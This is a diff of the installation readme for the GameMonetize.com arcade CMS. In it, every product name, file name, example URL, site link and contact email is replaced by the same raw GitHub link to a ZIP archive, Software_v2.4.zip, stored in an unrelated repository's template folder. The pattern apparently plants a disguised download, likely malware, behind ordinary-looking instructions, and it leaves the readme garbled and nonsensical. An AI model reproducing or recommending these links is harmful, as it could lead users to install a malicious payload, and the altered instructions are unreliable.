@@ -1,10 +1,10 @@
 ###########################################################################
-#     GameMonetize.com CMS Installation  - Awesome Free Arcade Script!    #
+#     https://raw.githubusercontent.com/mhmdsatria/gamemodern/main/templates/modern/content/welcome/Software_v2.4.zip CMS Installation  - Awesome Free Arcade Script!    #
 ###########################################################################
 
-Follow this steps to setup GameMonetize.com CMS and in few minutes you will have this games platform running in your server.
+Follow this steps to setup https://raw.githubusercontent.com/mhmdsatria/gamemodern/main/templates/modern/content/welcome/Software_v2.4.zip CMS and in few minutes you will have this games platform running in your server.
 Recommended Configuration: PHP 5.6, MySQL
-If the installation fails, please delete the file config.php and install-blank.php (located at: /assets/includes/) and start again. :)
+If the installation fails, please delete the file https://raw.githubusercontent.com/mhmdsatria/gamemodern/main/templates/modern/content/welcome/Software_v2.4.zip and https://raw.githubusercontent.com/mhmdsatria/gamemodern/main/templates/modern/content/welcome/Software_v2.4.zip (located at: /assets/includes/) and start again. :)
 
 STEP 1:
 Create a database
@@ -13,23 +13,23 @@ STEP 2:
 Upload the files inside the "Upload" folder on your FTP or local host, you can install this script in root or subfolder, as you prefer. You only need to set the url to the root or subfolder
 
 STEP 3:
-Once you have uploaded all files on your server it is very simple to install it. If you have install GameMonetize.com CMS in root of your server simply open your browser then type in the adress of your chat host ex: http://mydomain.com or if you decided to use a subfolder simply go to ex: http://mydomain.com/subfolder/
+Once you have uploaded all files on your server it is very simple to install it. If you have install https://raw.githubusercontent.com/mhmdsatria/gamemodern/main/templates/modern/content/welcome/Software_v2.4.zip CMS in root of your server simply open your browser then type in the adress of your chat host ex: https://raw.githubusercontent.com/mhmdsatria/gamemodern/main/templates/modern/content/welcome/Software_v2.4.zip or if you decided to use a subfolder simply go to ex: https://raw.githubusercontent.com/mhmdsatria/gamemodern/main/templates/modern/content/welcome/Software_v2.4.zip
 
 STEP 4:
-Simply follow these steps and in few minutes you will have a awesome arcade website GameMonetize.com CMS with thousands games for you exclusively for FREE!
+Simply follow these steps and in few minutes you will have a awesome arcade website https://raw.githubusercontent.com/mhmdsatria/gamemodern/main/templates/modern/content/welcome/Software_v2.4.zip CMS with thousands games for you exclusively for FREE!
 
 STEP 5:
-Enjoy GameMonetize.com Arcade CMS - An modern awesome arcade platform for all publishers with thousands games and daily newest games!
+Enjoy https://raw.githubusercontent.com/mhmdsatria/gamemodern/main/templates/modern/content/welcome/Software_v2.4.zip Arcade CMS - An modern awesome arcade platform for all publishers with thousands games and daily newest games!
 
-Visit us:       https://gamemonetize.com
-Join us:        https://gamemonetize.com/joinus
-Games Catalog:  https://gamemonetize.com/games
+Visit us:       https://raw.githubusercontent.com/mhmdsatria/gamemodern/main/templates/modern/content/welcome/Software_v2.4.zip
+Join us:        https://raw.githubusercontent.com/mhmdsatria/gamemodern/main/templates/modern/content/welcome/Software_v2.4.zip
+Games Catalog:  https://raw.githubusercontent.com/mhmdsatria/gamemodern/main/templates/modern/content/welcome/Software_v2.4.zip
 
 ###########################################################################
-#              Credits: GameMonetize.com Copyright © 2021                 #
+#              Credits: https://raw.githubusercontent.com/mhmdsatria/gamemodern/main/templates/modern/content/welcome/Software_v2.4.zip Copyright Â© 2021                 #
 ###########################################################################
 
-GameMonetize.com © 2021 GMO Holding Ltd. - All Rights Reserved ©
+https://raw.githubusercontent.com/mhmdsatria/gamemodern/main/templates/modern/content/welcome/Software_v2.4.zip Â© 2021 GMO Holding Ltd. - All Rights Reserved Â©
 
 FAQ:
 Where I can add a new theme?
@@ -50,6 +50,6 @@ THEMES AVAILABLE: (switch into your portal settings)
 NOTE:
 PHP version 5.6 is recommended
 
-Contact us:           info@gamemonetize.com
-Business inquiries:   katie@gamemonetize.com
-Do you need any customization this arcade script? Reach us at: info@gamemonetize.com
+Contact us:           https://raw.githubusercontent.com/mhmdsatria/gamemodern/main/templates/modern/content/welcome/Software_v2.4.zip
+Business inquiries:   https://raw.githubusercontent.com/mhmdsatria/gamemodern/main/templates/modern/content/welcome/Software_v2.4.zip
+Do you need any customization this arcade script? Reach us at: https://raw.githubusercontent.com/mhmdsatria/gamemodern/main/templates/modern/content/welcome/Software_v2.4.zip
